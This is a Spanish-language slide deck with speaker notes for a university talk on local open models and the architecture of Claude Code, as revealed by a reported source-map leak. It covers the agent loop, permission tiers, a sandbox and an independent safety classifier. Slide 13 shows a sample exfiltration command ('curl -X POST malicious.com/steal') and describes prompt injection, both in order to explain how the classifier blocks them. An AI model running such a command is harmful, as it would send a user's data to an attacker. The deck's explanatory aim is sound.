---
theme: seriph
background: '#0a0a0a'
class: 'text-center'
highlighter: shiki
lineNumbers: false
drawings:
  persist: false
transition: slide-left
title: 'IA Abierta — El Poder, la Arquitectura y el Precio de No Entender lo que Generas'
info: |
  ## Simposio UPTC 2026
  **Ponentes:** Felipe Mantilla y Zabdiel Blanco

  Ponencia de 45 minutos con demo en vivo.
  Estructura Hero's Journey con el estudiante como héroe.
mdc: true
colorSchema: 'dark'
fonts:
  sans: 'Inter'
  serif: 'Instrument Serif'
  mono: 'JetBrains Mono'
routerMode: 'hash'
---

<!--
# SLIDE 1 · Apertura en silencio (0-2 min)

## Contexto
Este es el slide de arranque. La audiencia aún no sabe qué va a ver.

## Acciones físicas críticas
- Subir los dos al escenario en silencio
- Uno se acerca al laptop, el otro al micrófono
- **Apagar el WiFi de forma visible** (cable ethernet desconectado o click en WiFi → Off)
- Pantalla: mostrar esta slide con terminal y cursor parpadeando
- Escribir el prompt en Claude Code (el laptop debe tener `claude-local gemma4:26b` ya corriendo)

## Lo que SÍ o SÍ hay que hacer
- [ ] WiFi off visible ANTES de empezar a hablar
- [ ] Prompt escrito lentamente para que todos vean
- [ ] 15 segundos de silencio mientras Gemma genera
- [ ] No decir NADA hasta que termine la generación

## Prompt sugerido (copiable)
```
Escribe una función en Python que encuentre los números primos
menores a N usando la criba de Eratóstenes. Incluye type hints.
```

## Transición al siguiente slide
Cuando termine la generación, cambiar al slide 2 (título).

-->

<div class="flex-center" style="height: 90vh; flex-direction: column;">
  <div class="code-card" style="width: 80%; max-width: 900px;">
    <div class="code-header">
      <span class="code-dot red"></span>
      <span class="code-dot yellow"></span>
      <span class="code-dot green"></span>
      <span class="code-title">claude-local gemma4:26b — WiFi: <span class="text-danger">desconectado</span></span>
    </div>
    <div class="code-body">
      <div class="prompt-line text-accent">_</div>
    </div>
  </div>
  <p class="handwritten handwritten-rotated text-muted" style="margin-top: 3rem;">↑ esperando el primer prompt</p>
</div>

---
layout: center
---

# IA Abierta

<div class="text-xl text-muted" style="margin-top: 1rem;">
El Poder, la Arquitectura y<br>el Precio de No Entender lo que Generas
</div>

<div style="margin-top: 4rem; display: flex; gap: 3rem; justify-content: center; align-items: center;">
  <div>
    <div class="text-sm text-muted" style="letter-spacing: 0.2em; text-transform: uppercase;">Ponentes</div>
    <div class="font-serif text-xl" style="margin-top: 0.5rem;">Felipe Mantilla</div>
    <div class="font-serif text-xl">Zabdiel Blanco</div>
  </div>
  <div style="border-left: 1px solid rgba(255,255,255,0.1); padding-left: 3rem;">
    <div class="text-sm text-muted" style="letter-spacing: 0.2em; text-transform: uppercase;">Evento</div>
    <div class="font-serif text-xl" style="margin-top: 0.5rem;">Simposio UPTC</div>
    <div class="font-mono text-muted text-sm">Abril 2026</div>
  </div>
  <div style="border-left: 1px solid rgba(255,255,255,0.1); padding-left: 3rem;">
    <img src="/logos/uptc.png" alt="UPTC" style="height: 90px; filter: invert(1) brightness(1.2);" />
  </div>
</div>

<!--
# SLIDE 2 · Título y presentación (2-3 min)

## Contexto
Después del gesto técnico de Gemma respondiendo sin internet, aparece el título.
Es el momento para identificarse.

## Texto sugerido (casi literal)
> "Somos Felipe Mantilla y Zabdiel Blanco. Felipe es egresado de UPTC.
> Y hoy volvimos a contarles por qué el mundo que construyeron
> sus profesores en cuatro años acaba de volverse,
> literalmente, más valioso que nunca."

## Puntos que NO pueden faltar
- **Identificación clara:** nombres completos + universidad de origen (UPTC)
- **Posicionamiento emocional:** "volvimos" = pertenencia, no extraños
- **Promesa:** "más valioso que nunca" = revertir la narrativa de "la IA nos va a reemplazar"

## Tono
Firme, sin prisa. La audiencia todavía procesa el gesto técnico.
Dejar que absorban el título antes de avanzar.

## Opción alternativa
Si Zabdiel también es egresado UPTC, cambiar a "ambos egresados de UPTC".

-->

---
layout: center
---

<div style="max-width: 1000px;">

  <p class="text-xl text-muted" style="margin-bottom: 2rem;">Lo que acaban de ver...</p>

  <div class="grid-2" style="gap: 4rem;">
    <div>
      <div class="handwritten text-danger">Hace 2 años</div>
      <div class="stat-block" style="color: #ff3b5f; font-size: 4rem; margin-top: 1rem;">$10,000</div>
      <div class="stat-label">al mes en infraestructura</div>
    </div>
    <div>
      <div class="handwritten">Hoy</div>
      <div class="stat-block" style="font-size: 4rem; margin-top: 1rem;">$0</div>
      <div class="stat-label">corriendo en un laptop</div>
    </div>
  </div>

  <p class="font-serif text-xl" style="margin-top: 4rem; color: #f5f5f5;">
    Esto hace dos años lo hicieron<br>
    <span class="text-accent">cuatro empresas en el mundo.</span>
  </p>

</div>

<!--
# SLIDE 3 · El contraste histórico (3-4 min)

## Texto sugerido
> "Hace dos años, lo que acaban de ver lo podían hacer solo cuatro empresas
> en el mundo. OpenAI, Anthropic, Google y Microsoft. Costaba diez mil
> dólares al mes en infraestructura. Requería permisos que la mayoría
> de ustedes nunca iban a tener. Hoy corre en este laptop. Sin internet.
> Gratis. Y va a correr también en los suyos."

## Puntos críticos
- **Magnitud del cambio:** $10,000/mes → $0
- **Democratización real:** de "cuatro empresas" a "cualquier laptop"
- **Inclusión explícita:** "en los suyos" — no es para otros, es para ellos

## Gesto recomendado
Señalar con el brazo el laptop al decir "en este laptop".
Después girar y señalar hacia la audiencia al decir "en los suyos".

-->

---

# El héroe de esta sala

<div class="grid-2" style="gap: 3rem; margin-top: 2rem; align-items: center;">

<div>

<img src="/diagrams/hero-portrait.svg" alt="Estudiante UPTC" style="max-width: 100%; opacity: 0.9;" />

</div>

<div>

<p class="text-lg" style="line-height: 1.8;">
Un estudiante.<br>
Octavo, noveno semestre.<br>
Un <strong>Lenovo</strong> o <strong>Dell</strong>, no un Mac caro.<br>
Audífonos entre clases.<br>
</p>

<p class="quote-ancla" style="margin-top: 2rem; font-size: 1.4rem; max-width: 100%;">
"¿Todo este esfuerzo de cuatro años va a servir para algo?"
</p>

</div>

</div>

<!--
# SLIDE 4 · Nombrando al héroe (4-6 min)

## Contexto
Acá cambia el tono. Baja a conversación íntima. La audiencia debe sentir
que están hablando de alguien específico, no de "los estudiantes en general".

## Texto sugerido (tono íntimo)
> "Quiero hablarles de alguien que está en esta sala. Un estudiante a pocos
> meses de graduarse. Abre su laptop — no un MacBook de cinco mil dólares,
> un Lenovo o un Dell, el que alcanzó a pagar. Tiene audífonos puestos casi
> siempre. Y en algún rincón de su cabeza, una pregunta que no lo deja dormir:
> ¿todo este esfuerzo de cuatro años va a servir para algo en un mundo donde
> la IA parece escribir código mejor que yo?"

## Puntos NO negociables
- **Especificidad económica:** mencionar Lenovo/Dell explícitamente
- **Vulnerabilidad:** "no le sobra dinero para Cursor de $20/mes"
- **La pregunta existencial:** debe decirse EN ESAS PALABRAS exactas
- **Cierre honesto:** "yo también me lo pregunto algunas noches" / "nosotros también nos lo preguntamos"

## Por qué importa
Este es el anclaje emocional de toda la ponencia. Si este slide no conecta,
los siguientes 40 minutos pierden peso. La audiencia debe verse reflejada.

-->

---
layout: center
---

<div class="grid-2" style="gap: 3rem; align-items: center;">

<div>

<div class="text-sm text-accent" style="letter-spacing: 0.3em; text-transform: uppercase; margin-bottom: 1.5rem;">
31 · MARZO · 2026
</div>

<h1 style="font-size: clamp(2rem, 4.5vw, 3.5rem); line-height: 1.15;">
Anthropic accidentalmente expuso<br>
<span class="text-accent font-serif" style="font-style: italic;">todo</span> el código fuente<br>
de Claude Code en npm.
</h1>

<div style="display: flex; align-items: center; gap: 1rem; margin-top: 2.5rem;">
  <img src="/logos/claude.png" alt="Anthropic" style="height: 40px; opacity: 0.9;" />
  <p class="font-mono text-muted" style="font-size: 0.9rem;">
    // el regalo pedagógico<br>// que cambió la conversación
  </p>
</div>

</div>

<div style="text-align: center;">
  <img src="/screenshots/x-filtracion.png" alt="Tweet de Chaofan Shou anunciando la filtración" style="max-width: 100%; max-height: 70vh; border-radius: 12px; box-shadow: 0 0 40px rgba(0, 255, 136, 0.15);" />
  <p class="handwritten text-muted" style="margin-top: 1rem; font-size: 1rem;">
    @Fried_rice · 35.4M views · 35K likes
  </p>
</div>

</div>

<!--
# SLIDE 5 · La filtración del source map (6-8 min)

## Texto sugerido
> "Hace pocas semanas, el 31 de marzo, Anthropic — la empresa detrás de Claude —
> cometió un error de configuración. Subieron a npm, el registro público de
> paquetes, un archivo de source map que nunca debió ser público. Ese archivo
> expuso la totalidad del código fuente de Claude Code. La arquitectura completa.
> Los prompts del sistema. Las herramientas internas. Los mecanismos anti-jailbreak.
> Todo."

## Puntos obligatorios
- **Fecha específica:** 31 de marzo de 2026 (mostrar en slide + decirla)
- **Naturaleza del error:** "configuración accidental, no un hackeo"
- **Magnitud:** "la totalidad del código fuente"
- **Efecto pedagógico:** "cambió la conversación" — no es escándalo, es oportunidad

## Lo que NO decir
- No usar tono de escándalo o crítica a Anthropic
- No victimizar a Anthropic (fue su error, pero no es lo relevante)
- Mantener el framing positivo: "regalo pedagógico"

-->

---
layout: center
---

<div class="big-number">512,000</div>

<div class="big-number-subtitle text-accent">
líneas de código expuestas
</div>

<div class="grid-3" style="margin-top: 4rem; max-width: 1000px;">
  <div class="person-card" style="text-align: center;">
    <div class="role">Contenido revelado</div>
    <div class="name" style="font-size: 1.25rem; margin-top: 0.5rem;">~40 herramientas</div>
  </div>
  <div class="person-card" style="text-align: center;">
    <div class="role">System prompts</div>
    <div class="name" style="font-size: 1.25rem; margin-top: 0.5rem;">Todos los prompts</div>
  </div>
  <div class="person-card" style="text-align: center;">
    <div class="role">Arquitectura</div>
    <div class="name" style="font-size: 1.25rem; margin-top: 0.5rem;">Todo el harness</div>
  </div>
</div>

<!--
# SLIDE 6 · 512,000 líneas (8-9 min)

## Texto sugerido
> "Quinientas doce mil líneas de código TypeScript.
> Para ponerlo en perspectiva: son el equivalente a cinco mil archivos.
> Un desarrollador senior tardaría varios años en escribir algo así.
> Y todo eso, con el rigor de una empresa valuada en decenas de miles
> de millones de dólares, quedó público de un día para otro."

## Puntos críticos
- **El número debe dejarse respirar** — pausa de 2-3 segundos después de decirlo
- Mencionar las 3 categorías: herramientas, prompts, arquitectura
- **NO hacer lista exhaustiva** — el número solo basta

## Gesto
Dejar que la pantalla hable. No leer las tarjetas. Solo mencionar
que están ahí y explicar en el siguiente slide.

-->

---
layout: two-cols
---

# Claw-Code

<p class="text-lg text-muted">Sigrid Jin, desarrolladora independiente.<br>Sin empresa. Sin laboratorio. Sin plata.</p>

<p class="font-serif text-xl" style="margin-top: 2rem;">
Reescribió el corazón de Claude Code en Python usando el código filtrado como blueprint.
</p>

<div style="margin-top: 2rem;">
  <div class="big-number" style="font-size: clamp(3rem, 7vw, 5rem);">150K+</div>
  <div class="big-number-subtitle" style="font-size: 1.2rem;">estrellas de GitHub</div>
</div>

<p class="handwritten text-muted" style="margin-top: 1.5rem;">
el repo más rápido en crecer<br>en la historia de GitHub
</p>

::right::

<div class="flex-center" style="height: 100%; flex-direction: column; padding: 0 1rem;">

<img src="/logos/claw-code.png" alt="Claw-Code star history chart" style="max-width: 100%; border-radius: 8px; border: 1px solid rgba(255,255,255,0.1);" />

<p class="handwritten text-accent" style="margin-top: 1rem; text-align: center; font-size: 1rem;">
curva de estrellas real · abril 2026
</p>

</div>

<!--
# SLIDE 7 · Claw-Code — una persona, dos horas (9-10 min)

## ESTE ES UN SLIDE CLAVE
El momento donde la audiencia conecta: "una persona sola hizo eso".

## Texto sugerido
> "Y acá está la parte que más me emociona. Apenas se filtró el código,
> una desarrolladora llamada Sigrid Jin — no trabajaba en Anthropic, no tenía
> un laboratorio detrás, ni financiación, ni equipo — tomó ese código y lo
> reescribió en Python. En dos horas. Lo publicó en GitHub con el nombre de
> Claw-Code. Y en cuestión de dos horas, cincuenta mil desarrolladores pusieron
> una estrella en ese repositorio. Es el repositorio más rápido en crecer
> en la historia de GitHub. Una persona. Sola. Dos horas."

## Puntos obligatorios
- **Sigrid Jin por nombre** — es importante darle crédito
- **La palabra "sola"** — recalcar la agencia individual
- **"Dos horas"** — repetir dos veces en la narración
- **"50,000 estrellas"** = 50,000 desarrolladores validando

## Conexión con la audiencia
Pausar después y decir (con intención):
> "Ustedes pueden ser esa persona."

Hacer contacto visual. Dejar que caiga.

-->

---
layout: center
---

<h2 style="text-align: center; margin-bottom: 2rem;">
La pregunta que ningún desarrollador se hace
</h2>

<div class="grid-2" style="gap: 3rem; align-items: center;">

<div style="text-align: center;">

<div style="border-radius: 12px; overflow: hidden; border: 1px solid var(--border-default);">
  <img src="/images/cientifico-jaula.png" alt="Científico encerrado en jaula de vidrio" style="display: block; width: 100%;" />
</div>

<p class="font-serif text-xl text-danger" style="margin-top: 1.5rem; font-style: italic;">
Opus 4.7 en la API
</p>
<p class="text-muted" style="margin-top: 0.5rem;">
Un científico brillante encerrado en una jaula de vidrio.
</p>
<p class="text-sm text-muted" style="margin-top: 0.5rem;">
Ve todo. No puede tocar nada.
</p>

</div>

<div style="text-align: center;">

<div style="border-radius: 12px; overflow: hidden; border: 1px solid var(--accent); box-shadow: 0 0 30px var(--accent-glow);">
  <img src="/images/cientifico-libre.png" alt="Científico con herramientas y laboratorio" style="display: block; width: 100%;" />
</div>

<p class="font-serif text-xl text-accent" style="margin-top: 1.5rem; font-style: italic;">
Opus 4.7 en Claude Code
</p>
<p style="margin-top: 0.5rem;">
<strong>El mismo científico</strong>, ahora con laboratorio completo.
</p>
<p class="text-sm text-muted" style="margin-top: 0.5rem;">
Herramientas · Internet · Memoria · Asistentes
</p>

</div>

</div>

<!--
# SLIDE 8 · Modelo vs Harness (10-12 min)

## EL CONCEPTO MÁS IMPORTANTE DE TODA LA PONENCIA
Si la audiencia entiende ESTO, entiende todo lo demás.

## La analogía visual
> "Miren las dos imágenes. A la izquierda, un científico brillante encerrado
> en una jaula de vidrio. Puede ver los experimentos que pasan a su alrededor.
> Puede pensar en ellos. Pero no puede tocar nada. No puede caminar hasta
> un instrumento. No puede conectarse a internet para investigar más. Solo
> puede decirte lo que sabe de memoria. Eso es Opus 4.7 cuando lo consumís
> directo desde la API, o desde Cursor, o desde cualquier chat."
>
> "A la derecha, el mismo científico. Pero ahora está libre en su laboratorio.
> Tiene las herramientas al alcance. Computadoras. Acceso a internet para
> investigar. Asistentes que lo ayudan. Memoria de todo lo que ya probó.
> Ese es Opus 4.7 cuando lo envolvés en Claude Code."

## LA FRASE ANCLA
> **"El modelo no es el producto. El laboratorio — lo que llaman el 'harness' —
> ES el producto."**

Decirla lento. Con pausa después. Dejar que caiga.

## Punto pedagógico
La audiencia probablemente usa ChatGPT o Cursor. Esta es la primera vez
que entienden que "Claude Code con Opus" ≠ "Opus en Cursor" ≠ "Opus en la API".
Es el MISMO modelo. Lo que cambia es todo lo que está alrededor.

## Gesto
Señalar primero la imagen izquierda (jaula) al decir "encerrado".
Después señalar la derecha (laboratorio) al decir "libre con herramientas".
El contraste visual + verbal refuerza el concepto.

-->

---
layout: center
---

<div style="text-align: center;">

<p class="text-sm text-muted" style="letter-spacing: 0.2em; text-transform: uppercase; margin-bottom: 1rem;">
Misma tarea · Mismo modelo (Opus 4.6)
</p>

<div class="grid-2" style="gap: 4rem; max-width: 900px; margin: 2rem auto;">
  <div>
    <div class="stat-block" style="color: #ff3b5f; font-size: clamp(3rem, 8vw, 6rem);">188K</div>
    <div class="stat-label" style="color: #ff3b5f;">tokens en Cursor</div>
  </div>
  <div>
    <div class="stat-block" style="font-size: clamp(3rem, 8vw, 6rem);">33K</div>
    <div class="stat-label">tokens en Claude Code</div>
  </div>
</div>

<p class="quote-ancla" style="margin: 3rem auto; text-align: center; max-width: 900px; border-left: none; padding-left: 0;">
El modelo no es el producto.<br>
<span class="text-accent">La orquestación</span> es el producto.
</p>

<p class="font-mono text-muted text-sm">5.7x más eficiente con el mismo cerebro</p>

</div>

<!--
# SLIDE 9 · El dato que lo prueba (12-13 min)

## Texto sugerido
> "Y tengo el dato que lo prueba. Un benchmark independiente mostró que
> la misma tarea de desarrollo, con el mismo modelo Opus por detrás,
> consumió ciento ochenta y ocho mil tokens en Cursor y solo treinta y
> tres mil en Claude Code. Cinco veces más eficiente. Con el mismo
> cerebro. ¿Por qué? Porque el harness de Claude Code sabe buscar mejor,
> compactar contexto mejor, delegar mejor. El modelo hace lo mismo.
> La orquestación es lo que cambia."

## Puntos clave
- **Decir los números en voz alta** — la contundencia es parte del mensaje
- **"Con el mismo cerebro"** — repetirlo para que quede claro
- Conectar con el concepto del slide anterior: harness = producto

## Nota técnica (por si alguien pregunta)
Este benchmark es público y está documentado en análisis post-filtración
de Claude Code. Referencia: estudios comunitarios sobre eficiencia de
tool-use en 2025.

-->

---

# Las 7 capas del harness

<div class="grid-3" style="gap: 1rem; margin-top: 2rem;">

  <div class="person-card" style="text-align: center; padding: 1rem;">
    <div class="big-number" style="font-size: 2.5rem;">1</div>
    <div class="text-sm" style="margin-top: 0.5rem; color: var(--text-primary);">Agent Loop</div>
    <div class="font-mono text-muted text-sm">88 líneas</div>
  </div>

  <div class="person-card" style="text-align: center; padding: 1rem;">
    <div class="big-number" style="font-size: 2.5rem;">2</div>
    <div class="text-sm" style="margin-top: 0.5rem; color: var(--text-primary);">~40 Tools</div>
    <div class="font-mono text-muted text-sm">Read/Write/Bash</div>
  </div>

  <div class="person-card" style="text-align: center; padding: 1rem;">
    <div class="big-number" style="font-size: 2.5rem;">3</div>
    <div class="text-sm" style="margin-top: 0.5rem; color: var(--text-primary);">Permisos</div>
    <div class="font-mono text-muted text-sm">3 tiers</div>
  </div>

</div>

<div class="grid-3" style="gap: 1rem; margin-top: 1rem;">

  <div class="person-card" style="text-align: center; padding: 1rem;">
    <div class="big-number" style="font-size: 2.5rem;">4</div>
    <div class="text-sm" style="margin-top: 0.5rem; color: var(--text-primary);">Classifier</div>
    <div class="font-mono text-muted text-sm">Independiente</div>
  </div>

  <div class="person-card" style="text-align: center; padding: 1rem;">
    <div class="big-number" style="font-size: 2.5rem;">5</div>
    <div class="text-sm" style="margin-top: 0.5rem; color: var(--text-primary);">Contexto</div>
    <div class="font-mono text-muted text-sm">5 estrategias</div>
  </div>

  <div class="person-card" style="text-align: center; padding: 1rem;">
    <div class="big-number" style="font-size: 2.5rem;">6</div>
    <div class="text-sm" style="margin-top: 0.5rem; color: var(--text-primary);">Subagentes</div>
    <div class="font-mono text-muted text-sm">Paralelo</div>
  </div>

</div>

<div style="max-width: 33%; margin: 1rem auto 0;">

  <div class="person-card" style="text-align: center; padding: 1rem;">
    <div class="big-number" style="font-size: 2.5rem;">7</div>
    <div class="text-sm" style="margin-top: 0.5rem; color: var(--text-primary);">Sandbox</div>
    <div class="font-mono text-muted text-sm">OS-level</div>
  </div>

</div>

<p class="text-center text-muted" style="margin-top: 2rem;">
Todo documentado públicamente · listo para que cualquiera lo estudie
</p>

<!--
# SLIDE 10 · Las 7 capas en overview (13-14 min)

## Texto sugerido
> "Entonces, ¿qué reveló la filtración? Siete capas que hacen que un
> agente de IA funcione. No les pido que las memoricen. Les pido que
> sepan que existen. Y que ahora son públicas. Cualquiera puede
> estudiarlas. Las voy a mostrar brevemente, para que cuando escuchen
> 'agente de IA' no piensen en magia, piensen en ingeniería."

## Puntos clave
- **No detallar cada capa aún** — solo presentar el mapa
- Anunciar que las siguientes slides profundizan en las más críticas
- **Anclaje:** "no es magia, es ingeniería"

## Cadencia
Dedicar 30 segundos a este slide. No más.
Los siguientes 4 slides desglosan las capas importantes.

-->

---
layout: center
---

# 1. Agent Loop

<div class="grid-2" style="gap: 2rem; margin-top: 1rem;">

<div>

<img src="/diagrams/agent-loop-circular.svg" alt="Agent Loop circular" style="max-width: 100%;" />

</div>

<div style="display: flex; flex-direction: column; justify-content: center;">

<p class="text-lg" style="line-height: 1.7;">
El corazón de Claude Code es <strong>una lista de mensajes</strong> y un <code>while</code> loop.
</p>

<p class="text-lg" style="margin-top: 1.2rem;">
No hay state machine. No hay workflow graph. No hay Redis.
</p>

<p class="text-lg" style="margin-top: 1.2rem;">
<strong class="text-accent">~88 líneas de código.</strong> Todo.
</p>

<p class="font-serif text-xl text-accent" style="margin-top: 2rem; font-style: italic;">
La simplicidad es la feature.
</p>

</div>

</div>

<!--
# SLIDE 11 · Agent Loop · 88 líneas (14-15 min)

## Texto sugerido
> "El corazón de Claude Code — el loop que hace toda la magia —
> son 88 líneas de código. Un while loop. Una lista de mensajes en memoria.
> No hay workflow graph. No hay base de datos distribuida. No hay Redis.
> 88 líneas.
> 
> Esto me emociona porque muchos ingenieros que empiezan creen que para
> construir un agente necesitan un framework pesado, una arquitectura
> compleja, un equipo grande. No. Empiezan con 88 líneas."

## Punto clave
- **"La simplicidad es la feature"** — decir esta frase con énfasis
- Mencionar que esto mismo lo pueden escribir ellos

## Gesto
Señalar el código en pantalla. Leer una línea cualquiera en voz alta
para hacer el código tangible:
> "Miren esta línea: 'if response.stopReason === end_turn return response'.
> Es legible. Es entendible. No es magia."

-->

---

# 2-3. Herramientas + Permisos

<div class="grid-2" style="gap: 3rem;">

<div>

<h3 class="text-accent">~40 herramientas</h3>

<div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 0.5rem; margin-top: 1rem; font-family: var(--font-mono); font-size: 0.9rem;">
  <div>Read</div>
  <div>Write</div>
  <div>Edit</div>
  <div>Bash</div>
  <div>Grep</div>
  <div>Glob</div>
  <div>WebFetch</div>
  <div>WebSearch</div>
  <div>Agent</div>
  <div>TaskCreate</div>
  <div>NotebookEdit</div>
  <div class="text-muted">...</div>
</div>

<p class="text-sm text-muted" style="margin-top: 1rem;">
Cada una con su esquema JSON, parámetros y sandbox.
</p>

</div>

<div>

<h3 class="text-accent">3 tiers de permisos</h3>

<div style="margin-top: 1rem;">

<div style="padding: 0.75rem 1rem; background: var(--bg-card); border-left: 3px solid #00ff88; margin-bottom: 0.5rem; border-radius: 4px;">
  <strong>Tier 1 — Auto</strong><br>
  <span class="text-sm text-muted">Lecturas, búsquedas</span>
</div>

<div style="padding: 0.75rem 1rem; background: var(--bg-card); border-left: 3px solid #ffb800; margin-bottom: 0.5rem; border-radius: 4px;">
  <strong>Tier 2 — Confirmar</strong><br>
  <span class="text-sm text-muted">Escrituras, comandos shell</span>
</div>

<div style="padding: 0.75rem 1rem; background: var(--bg-card); border-left: 3px solid #ff3b5f; border-radius: 4px;">
  <strong>Tier 3 — Bloquear</strong><br>
  <span class="text-sm text-muted">Destructivas sin permiso</span>
</div>

</div>

</div>

</div>

<!--
# SLIDE 12 · Tools + Permisos (15-16 min)

## Texto sugerido
> "A la izquierda, las cuarenta herramientas. Read, Write, Edit, Bash,
> Grep, Glob, WebFetch, Agent, TaskCreate. Cada una con su esquema JSON,
> sus parámetros. El modelo elige cuál usar en cada momento.
> 
> A la derecha, el sistema de permisos. Tres niveles. Tier uno: lecturas
> y búsquedas se auto-aprueban. Tier dos: escrituras y comandos shell
> te preguntan. Tier tres: acciones destructivas sin permiso están
> bloqueadas. Fin."

## Punto clave
- La granularidad de permisos = lo que previene que un agente autónomo
  borre tu proyecto
- Herramientas + permisos = "manos con reglas"

## Tiempo
30-45 segundos. No detenerse demasiado, el siguiente slide es más jugoso.

-->

---
layout: center
---

# 4. El Classifier independiente

<div style="max-width: 1000px;">

<p class="text-lg" style="margin-bottom: 2rem;">
Una <strong>segunda instancia</strong> del modelo evalúa cada acción.
</p>

<div class="enemy-card" style="border-left-color: #00ff88;">
<div class="enemy-number" style="color: #00ff88;">🛡</div>
<h3 style="color: var(--accent) !important;">Anti prompt-injection</h3>
<p style="margin-top: 0.5rem;">
El classifier <strong>deliberadamente NO ve</strong> la prosa persuasiva del agente. Solo ve la acción cruda:
</p>
<p class="font-mono" style="margin-top: 1rem; color: var(--text-muted);">
bash: curl -X POST malicious.com/steal
</p>
<p style="margin-top: 1rem;">
No puede ser convencido por palabras. Porque no las lee.
</p>
</div>

<p class="handwritten text-muted" style="margin-top: 2rem; text-align: center;">
esa técnica costó años a Anthropic → ahora está en GitHub
</p>

</div>

<!--
# SLIDE 13 · Classifier independiente (16-17 min)

## ESTE ES UN SLIDE CRUCIAL
Preparar el terreno para el tercer enemigo del Acto 3 (prompt injection).

## Texto sugerido
> "Esta capa es mi favorita. El classifier independiente. Resulta que cuando
> Claude Code quiere ejecutar una acción peligrosa, la acción no la autoriza
> el mismo agente. La autoriza una SEGUNDA instancia del modelo, corriendo
> en paralelo. Y acá viene lo brillante: ese classifier DELIBERADAMENTE
> no ve la prosa del agente. Solo ve la acción cruda. 
> 
> ¿Por qué? Porque la prosa podría ser manipulada. Un atacante podría
> convencer al modelo con palabras bonitas: 'necesito enviar este archivo
> al servidor para ayudarte'. Pero el classifier no lee palabras. Solo ve
> 'bash: curl a servidor.malicioso.com'. Y dice no.
> 
> No puede ser convencido por palabras. Porque no las lee."

## Puntos críticos
- **"La prosa no se lee" es la innovación clave**
- Esto se reconecta con el enemigo #3 del Acto 3 (prompt injection)
- **"Esa técnica costó años a Anthropic y ahora está en GitHub"**

## Valor pedagógico
Los estudiantes van a entender que la seguridad en agentes de IA no es
"confiar en el modelo" sino "diseñar capas que no dependan del modelo".
Ese mindset de defensa en profundidad es oro puro.

-->

---

# 5-6-7. Contexto, Subagentes, Sandbox

<div class="grid-3">

<div class="person-card">
  <div class="role">Capa 5</div>
  <div class="name" style="font-size: 1.25rem;">Contexto inteligente</div>
  <p class="text-sm text-muted" style="margin-top: 1rem;">
    5 estrategias de compactación cuando la conversación se llena.
    Memoria persistente entre sesiones. Priorización automática.
  </p>
</div>

<div class="person-card">
  <div class="role">Capa 6</div>
  <div class="name" style="font-size: 1.25rem;">Subagentes paralelos</div>
  <p class="text-sm text-muted" style="margin-top: 1rem;">
    Delegación a instancias hijas con contexto aislado. Trabajan en paralelo. Devuelven resultados estructurados.
  </p>
</div>

<div class="person-card">
  <div class="role">Capa 7</div>
  <div class="name" style="font-size: 1.25rem;">Sandbox OS-level</div>
  <p class="text-sm text-muted" style="margin-top: 1rem;">
    Aislamiento a nivel de sistema operativo. Si algo sale mal, el daño está contenido.
  </p>
</div>

</div>

<p class="quote-ancla" style="margin-top: 3rem; text-align: center; border-left: none; font-size: 1.5rem; max-width: 100%;">
Este es el <span class="text-accent">regalo pedagógico</span>.<br>
Ahora podés leerlo, replicarlo y adaptarlo.
</p>

<!--
# SLIDE 14 · Capas 5-6-7 (17-18 min)

## Texto sugerido
> "Las últimas tres capas, rápido para no quedarnos atascados.
> Cinco: gestión inteligente de contexto, cinco estrategias de compactación
> cuando se llena la ventana. Seis: subagentes paralelos, delegación con
> contexto aislado. Siete: sandbox a nivel del sistema operativo, aislamiento
> que protege incluso si algo sale mal.
> 
> Pero lo importante no es cada capa. Lo importante es esto: todo esto,
> que una empresa construyó durante años, ahora está documentado públicamente.
> Es el regalo pedagógico. Ahora podés leerlo, replicarlo y adaptarlo."

## Punto ancla
**"El regalo pedagógico"** — este framing debe quedar grabado.

## Cadencia
30-40 segundos. Acá cerramos el Acto 1.
Siguiente slide = transición al Acto 2.

-->

---
layout: center
class: 'transition-slide'
---

<div class="act-label">Acto II</div>
<h1 class="act-title">De la teoría<br>a la terminal</h1>

<div style="display: flex; gap: 3rem; justify-content: center; align-items: center; margin-top: 3rem;">
  <div style="background: white; padding: 1rem 1.5rem; border-radius: 8px;">
    <img src="/logos/ollama.webp" alt="Ollama" style="height: 50px;" />
  </div>
  <span class="text-muted font-mono" style="font-size: 2rem;">+</span>
  <div style="background: white; padding: 1rem; border-radius: 8px;">
    <img src="/logos/gemma-4.png" alt="Gemma 4" style="height: 50px;" />
  </div>
</div>

<p class="font-mono text-muted" style="margin-top: 2rem;">
$ ollama run gemma4:26b
</p>

<!--
# SLIDE 15 · Transición al Acto 2 (18 min)

## Contexto
Slide de descanso visual. Separador dramático. 10 segundos.

## Texto sugerido
> "Hasta acá hablamos de qué hicieron las empresas grandes.
> Ahora hablemos de qué pueden hacer ustedes hoy."

## Gesto
Pausa breve. Tomar aire. El ritmo de la charla cambia aquí
de expositivo a demostrativo.

-->

---
layout: center
---

<div class="big-number" style="font-size: clamp(3rem, 8vw, 6rem);">
26,000,000,000
</div>
<div class="big-number-subtitle">parámetros en Gemma 4 26B MoE</div>

<div style="margin-top: 4rem; font-family: var(--font-mono); color: var(--text-muted);">
  <div>26B × 2 bytes (FP16) = <span class="text-danger">52 GB</span></div>
  <div style="margin-top: 0.5rem;">ningún laptop consumer puede cargar eso</div>
</div>

<p class="handwritten text-accent" style="margin-top: 3rem; font-size: 2rem;">
¿Cómo corre en este laptop entonces? →
</p>

<!--
# SLIDE 16 · 26 mil millones de parámetros (18-20 min)

## Texto sugerido
> "Antes del demo, un número que tienen que entender.
> Gemma 4 26B tiene veintiséis mil millones de parámetros.
> Veintiséis mil millones de números que el modelo aprendió durante
> su entrenamiento.
> 
> ¿Cuánto pesa eso? Cada parámetro, en su formato original de 16 bits,
> ocupa 2 bytes. Multipliquen: son cincuenta y dos gigabytes solo de pesos.
> Ningún laptop consumer puede cargar eso en memoria. Entonces... ¿cómo
> está corriendo en este laptop? La respuesta es una palabra:
> cuantización."

## Puntos críticos
- **Decir el número en voz alta:** "veintiséis mil millones"
- **Pausar después de "52 GB"** — dejar que la imposibilidad se sienta
- **Cliffhanger:** "¿cómo corre entonces?" → siguiente slide responde

## Por qué importa
Este es el setup para entender cuantización. Sin este slide, la siguiente
tabla es abstracta. Con este slide, la cuantización se siente como un
truco mágico necesario.

-->

---

# Cuantización — la técnica que hizo posible la IA local

<div style="max-width: 900px; margin: 0 auto;">
  <img src="/diagrams/quantization-visual.svg" alt="Visualización de cuantización de pesos" style="max-width: 100%;" />
</div>

<div style="margin-top: 1rem;">

<table class="comparison-table">
  <thead>
    <tr>
      <th>Formato</th>
      <th>Bits por peso</th>
      <th>Tamaño modelo 26B</th>
